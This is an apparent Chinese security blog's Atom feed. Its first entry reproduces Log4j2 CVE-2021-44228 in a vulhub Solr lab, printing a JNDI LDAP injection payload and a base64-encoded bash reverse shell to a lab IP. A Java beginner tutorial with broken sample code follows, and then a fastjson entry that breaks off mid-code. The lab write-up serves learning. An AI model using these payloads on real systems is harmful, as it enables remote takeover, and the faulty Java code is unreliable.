<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sunian</title>
  
  <subtitle>一颗飘忽的蒲公英种子，在风中飞舞，虽不起眼，却永不停歇，不断追寻自己的归宿。</subtitle>
  <link href="https://blog.sunian.link/atom.xml" rel="self"/>
  
  <link href="https://blog.sunian.link/"/>
  <updated>2023-08-30T12:45:35.077Z</updated>
  <id>https://blog.sunian.link/</id>
  
  <author>
    <name>sunian</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>log4j2</title>
    <link href="https://blog.sunian.link/2023/08/07/log4j2/"/>
    <id>https://blog.sunian.link/2023/08/07/log4j2/</id>
    <published>2023-08-07T12:39:15.000Z</published>
    <updated>2023-08-30T12:45:35.077Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Log4j2-的介绍"><a href="#Log4j2-的介绍" class="headerlink" title="Log4j2 的介绍"></a>Log4j2 的介绍</h3><p>Log4j2 是一个用于Java应用程序的强大日志记录库，旨在提供高性能、灵活性和可配置性的日志记录功能。Log4j 2 是 Apache Log4j 项目的一部分，是 Log4j 日志记录库的下一代版本。它是用于在应用程序中生成日志消息的工具，以便于开发人员能够监控、调试和分析应用程序的运行情况。</p><p>简单来说他有着 记录日志,  监控应用程序运行,  故障诊断,  性能分析,  合规性和安全性</p><h3 id="Log4j2-漏洞产生"><a href="#Log4j2-漏洞产生" class="headerlink" title="Log4j2 漏洞产生"></a>Log4j2 漏洞产生</h3><p>${} 语法:  Log4j2 允许开发人员使用这个语法来调用一些系统的变量 . </p><p><strong>代码例子:</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;Configuration&gt;</span><br><span class="line">    &lt;Appenders&gt;</span><br><span class="line">        &lt;Console name=&quot;ConsoleAppender&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">            &lt;PatternLayout pattern=&quot;%d&#123;HH:mm:ss.SSS&#125; $&#123;sys:a&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;/&gt;</span><br><span class="line">        &lt;/Console&gt;</span><br><span class="line">    &lt;/Appenders&gt;</span><br><span class="line">    &lt;Loggers&gt;</span><br><span class="line">        &lt;Root level=&quot;debug&quot;&gt;</span><br><span class="line">            &lt;AppenderRef ref=&quot;ConsoleAppender&quot;/&gt;</span><br><span class="line">        &lt;/Root&gt;</span><br><span class="line">    &lt;/Loggers&gt;</span><br><span class="line">&lt;/Configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在上面的配置中，<code>$&#123;sys:a&#125;</code> 会被替换为系统变量 <code>a</code> 的值。<code>$&#123;sys:a&#125;</code> 是 Log4j2 特定语法，用于引入系统属性 <code>a</code> 的值。然后，<code>%d&#123;HH:mm:ss.SSS&#125;</code> 是日期格式，<code>[%t]</code> 是线程名，<code>%-5level</code> 是日志级别，<code>%logger&#123;36&#125;</code> 是类名（截断为最多 36 个字符），<code>%msg</code> 是日志消息本身。<code>%n</code> 是换行符。</p><p>如果系统属性 <code>a</code> 的值是 <code>12345</code>，那么相应的日志消息将会是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15:42:17.123 12345 [main] DEBUG com.example.MyApp - This is a debug message.</span><br></pre></td></tr></table></figure><p><strong>通俗点来说:</strong> </p><p>比如说有一条日志长这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[main] DEBUG com.example.MyApp - This is a debug message.</span><br></pre></td></tr></table></figure><p>利用 ${} 语法, 比如系统里面有个变量是 a &#x3D; 12345</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:a&#125;[main] DEBUG com.example.MyApp - This is a debug message.   //这里用 $&#123;sys:&#125; 是引入变量的完整语法</span><br><span class="line">最后变成</span><br><span class="line">12345   [main] DEBUG com.example.MyApp - This is a debug message.</span><br></pre></td></tr></table></figure><h3 id="Log4j2-语法利用"><a href="#Log4j2-语法利用" class="headerlink" title="Log4j2 语法利用"></a>Log4j2 语法利用</h3><p>这个语法不仅只有调用变量的功能, 还可以用 <code>$&#123;jndi:jndi://10.10.10.11/abc&#125;</code> 这个语法来加载远程的类并进行反序列化 </p><p>所以需要启动一个JNDI 服务让Log4j2 进行远程加载调用</p><p>这里可以用到工具 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </p><h3 id="Log4j2-漏洞利用"><a href="#Log4j2-漏洞利用" class="headerlink" title="Log4j2 漏洞利用"></a>Log4j2 漏洞利用</h3><p>知道可以利用这个语法了, 那就得找一个可以被控制的利用点</p><p>CVE-2021-44228漏洞产生的根本原因在于Log4j2在处理用户提供的输入时存在安全漏洞。具体来说，漏洞路径位于<code>/solr/admin/cores?action=</code>，这个路径实际上是Solr搜索引擎的管理接口，允许管理员对Solr实例中的核进行管理操作，如核的创建、删除、重载、重新加载等。</p><p>漏洞的核心问题在于对输入参数<code>action</code>的处理。攻击者通过在<code>action</code>参数中传入<code>$&#123;&#125;</code>语法，利用Log4j2的解析机制来执行恶意代码。</p><p>即是:  &#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D;</p><h3 id="Log4j2-漏洞复现"><a href="#Log4j2-漏洞复现" class="headerlink" title="Log4j2 漏洞复现"></a>Log4j2 漏洞复现</h3><p>这里用到的靶场为 vulhub  log4j2 CVE-2012-44228</p><p>先启动 JDNI 服务  JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;要执行的命令&quot; -A 服务器地址</span><br><span class="line">如: java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;ping dnslog&quot; -A 192.168.6.5</span><br></pre></td></tr></table></figure><p>制作反弹shell 命令 , 因为一些其他原因, 需要对 反弹shell 命令进行 base64 编码 ,再解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/192.168.57.129/8899 0&gt;&amp;1  base64 -&gt; YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>启动 JDNI 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ny4xMjkvODg5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 192.168.57.129</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202708227.png" alt="image-20230830202708227">   </p><p>启动 NC 监听</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830201310125.png" alt="image-20230830201310125">    </p><p>进入靶场</p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830195940858.png" alt="image-20230830195940858"> </p><p>找到利用点 &#x2F;solr&#x2F;admin&#x2F;cores?action&#x3D; </p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830200113000.png" alt="image-20230830200113000"> </p><p>url后拼接 payload </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://192.168.57.129:1389/w1t1db&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202830366.png" alt="image-20230830202830366"> </p><p>最后nc 这个接收到反弹shell </p><p><img src="https://cdn.jsdelivr.net/gh/suniano/image/img/image-20230830202917231.png" alt="image-20230830202917231"> </p><p>到了最后, 我再想声明一下, 因为我的能力有限, 所以如果上面有不对的地方,可以提醒一下哈 ! </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Log4j2-的介绍&quot;&gt;&lt;a href=&quot;#Log4j2-的介绍&quot; class=&quot;headerlink&quot; title=&quot;Log4j2 的介绍&quot;&gt;&lt;/a&gt;Log4j2 的介绍&lt;/h3&gt;&lt;p&gt;Log4j2 是一个用于Java应用程序的强大日志记录库，旨在提供高性能、灵</summary>
      
    
    
    
    <category term="漏洞复现" scheme="https://blog.sunian.link/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="log4j2" scheme="https://blog.sunian.link/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>JAVA快速入门</title>
    <link href="https://blog.sunian.link/2023/08/05/JAVA%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
    <id>https://blog.sunian.link/2023/08/05/JAVA%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</id>
    <published>2023-08-05T14:25:10.000Z</published>
    <updated>2023-08-05T14:30:38.851Z</updated>
    
    <content type="html"><![CDATA[<h3 id="JAVA-基础"><a href="#JAVA-基础" class="headerlink" title="JAVA 基础"></a>JAVA 基础</h3><p>项目要求: </p><p>在JAVA 创建一个 User 类 , 类里面有两个属性分别为 name 和 age , 给name 和 age 赋值分别赋值为 “jack” 和 18 , 最后将name 和 age 打印出来</p><p>现在用代码演示</p><p>在 JAVA 的数据里,万物皆为对象, 所以先创建一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;  <span class="comment">// 定义一个公共类 User , public 公共的,随都能访问</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 JAVA 里面有一个固定的 main 方法, 他是一个程序的入口, 因为他是程序的入口,所以要设置为静态, 因为静态方法是不用实例化就能用的,如果 main 方法不设置静态,那就要实例化, 那程序入口在哪?是吧? </p><p>JAVA main 方法固定样式 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;  <span class="comment">// 定义一个公共类 User , public 公共的,随都能访问</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;   <span class="comment">// void 无返回值 String[] 字符串数组 args </span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 JAVA 里要定义属性样式    修饰符 类型 属性名 ; </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;  <span class="comment">// 定义一个公共类 User , public 公共的,随都能访问</span></span><br><span class="line">    <span class="keyword">private</span> String name;  <span class="comment">// 定义一个私有的字符串型属性 name</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;      <span class="comment">// 定义一个私有的整型属性 age</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;   <span class="comment">// void 无返回值 String[] 字符串数组 args </span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在JAVA 里如果需要对一个属性进行赋值就需要定义一个方法去给他赋值, 这样就保护了属性被非法修改, 一般定义这样的 setName , Name 为我们的属性名, 因为设置属性只要设置就行了, 没有返回值所以类型为 void </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;  <span class="comment">// 定义一个公共类 User , public 公共的,随都能访问</span></span><br><span class="line">    <span class="keyword">private</span> String name;  <span class="comment">// 定义一个私有的字符串型属性 name</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;      <span class="comment">// 定义一个私有的整型属性 age</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;   <span class="comment">// void 无返回值 String[] 字符串数组 args </span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String Name)</span>&#123;   <span class="comment">// 设置 name 属性的方法</span></span><br><span class="line">        name = Name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> Age)</span>&#123;   <span class="comment">// 设置 age 属性的方法</span></span><br><span class="line">        age = Age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相应的有 set 方法 ,也有获取属性的方法 getName ,这样命名的, 相反的是这个方法是有返回值类型的但没有形参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;  <span class="comment">// 定义一个公共类 User , public 公共的,随都能访问</span></span><br><span class="line">    <span class="keyword">private</span> String name;  <span class="comment">// 定义一个私有的字符串型属性 name</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;      <span class="comment">// 定义一个私有的整型属性 age</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;   <span class="comment">// void 无返回值 String[] 字符串数组 args </span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String Name)</span>&#123;   <span class="comment">// 设置 name 属性的方法</span></span><br><span class="line">        name = Name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> Age)</span>&#123;   <span class="comment">// 设置 age 属性的方法</span></span><br><span class="line">        age = Age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">setName</span><span class="params">()</span>&#123;   <span class="comment">// 获取 name 属性的方法</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">setAge</span><span class="params">()</span>&#123;   <span class="comment">// 获取 age 属性的方法</span></span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本的框架搭完了, 来完成要求 </p><p>给 name age 属性赋值 ,要赋值得先 实例化 User 类 即 : new User  ,我们需要在 main 方法类开始 , 因为是入口嘛! </p><p>实例化一个类样式  类名 变量名 &#x3D; new 类名 ;</p><p>利用 类名点方法名这样去调用一个方法   user.setName() </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;  <span class="comment">// 定义一个公共类 User , public 公共的,随都能访问</span></span><br><span class="line">    <span class="keyword">private</span> String name;  <span class="comment">// 定义一个私有的字符串型属性 name</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;      <span class="comment">// 定义一个私有的整型属性 age</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;   <span class="comment">// void 无返回值 String[] 字符串数组 args </span></span><br><span class="line">        </span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();  <span class="comment">// 实例化类</span></span><br><span class="line">        user.setName(<span class="string">&quot;jack&quot;</span>);    <span class="comment">// 设置 name 属性值为 jack </span></span><br><span class="line">        user.setAge(<span class="number">18</span>);         <span class="comment">// 设置 age 属性值为 18</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> getName(); <span class="comment">// 获取 name属性的值赋值给 name1</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">age1</span> <span class="operator">=</span> getAge();      <span class="comment">// 获取 age 属性的值给 age1</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String Name)</span>&#123;   <span class="comment">// 设置 name 属性的方法</span></span><br><span class="line">        name = Name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> Age)</span>&#123;   <span class="comment">// 设置 age 属性的方法</span></span><br><span class="line">        age = Age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">setName</span><span class="params">()</span>&#123;   <span class="comment">// 获取 name 属性的方法</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">setAge</span><span class="params">()</span>&#123;   <span class="comment">// 获取 age 属性的方法</span></span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后打印 这两个属性那就需要使用一些内置的类的方法  System.out.println </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span>&#123;  <span class="comment">// 定义一个公共类 User , public 公共的,随都能访问</span></span><br><span class="line">    <span class="keyword">private</span> String name;  <span class="comment">// 定义一个私有的字符串型属性 name</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;      <span class="comment">// 定义一个私有的整型属性 age</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;   <span class="comment">// void 无返回值 String[] 字符串数组 args </span></span><br><span class="line">        </span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();  <span class="comment">// 实例化类</span></span><br><span class="line">        user.setName(<span class="string">&quot;jack&quot;</span>);    <span class="comment">// 设置 name 属性值为 jack </span></span><br><span class="line">        user.setAge(<span class="number">18</span>);         <span class="comment">// 设置 age 属性值为 18</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> getName(); <span class="comment">// 获取 name属性的值赋值给 name1</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">age1</span> <span class="operator">=</span> getAge();      <span class="comment">// 获取 age 属性的值给 age1</span></span><br><span class="line">        System.out.println(name1); <span class="comment">// 打印 name1</span></span><br><span class="line">        System.out.println(age1);  <span class="comment">// 打印 age1</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String Name)</span>&#123;   <span class="comment">// 设置 name 属性的方法</span></span><br><span class="line">        name = Name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> Age)</span>&#123;   <span class="comment">// 设置 age 属性的方法</span></span><br><span class="line">        age = Age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">setName</span><span class="params">()</span>&#123;   <span class="comment">// 获取 name 属性的方法</span></span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">setAge</span><span class="params">()</span>&#123;   <span class="comment">// 获取 age 属性的方法</span></span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>待更新 . . . </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;JAVA-基础&quot;&gt;&lt;a href=&quot;#JAVA-基础&quot; class=&quot;headerlink&quot; title=&quot;JAVA 基础&quot;&gt;&lt;/a&gt;JAVA 基础&lt;/h3&gt;&lt;p&gt;项目要求: &lt;/p&gt;
&lt;p&gt;在JAVA 创建一个 User 类 , 类里面有两个属性分别为 name</summary>
      
    
    
    
    <category term="JAVA编程" scheme="https://blog.sunian.link/categories/JAVA%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="JAVA" scheme="https://blog.sunian.link/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>我对fastjson漏洞的理解</title>
    <link href="https://blog.sunian.link/2023/08/05/%E6%88%91%E5%AF%B9fastjson%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%90%86%E8%A7%A3/"/>
    <id>https://blog.sunian.link/2023/08/05/%E6%88%91%E5%AF%B9fastjson%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%90%86%E8%A7%A3/</id>
    <published>2023-08-05T14:24:50.000Z</published>
    <updated>2023-08-05T14:28:55.600Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Fastjson-介绍"><a href="#Fastjson-介绍" class="headerlink" title="Fastjson  介绍"></a>Fastjson  介绍</h3><p>他就是一个拿来处理 json 数据的, 现在为止处理json 数据就他最强最快,他是我们国内是阿里巴巴公司开源的一款JSON解析库. </p><p>可用于将Java对象序列化为其JSON表示形式，也可以用于将JSON字符串反序列化为等效的Java对象。 </p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p>序列化 : 将一个对象转换成一条字符串, 可以永久存储 , 也便于传输</p><p>反序列化: 将一条字符串重新构造成一个对象 </p><h3 id="JAVA-序列化与反序列化"><a href="#JAVA-序列化与反序列化" class="headerlink" title="JAVA 序列化与反序列化"></a>JAVA 序列化与反序列化</h3><p>JAVA 的序列化:   在原生的JAVA序列化里, 如果需要对一个对象就行序列化,这个类就要实现  <code>Serializable </code>接口 ,这个 <code>Serializable</code> 接口并没有任何的方法, 实现这个接口就说明实现这个接口的类具有序列化的能力, 也可以进行反序列化 ,如果一个类没有实现<code>Serializable</code>接口，那么当尝试对其对象进行序列化时，将会抛出<code>java.io.NotSerializableException</code>异常。</p><p>如下: 创建一个 Person 类, 并且实现 Serializable 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;   <span class="comment">// implements 实现</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对这个类进行序列化 和反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> 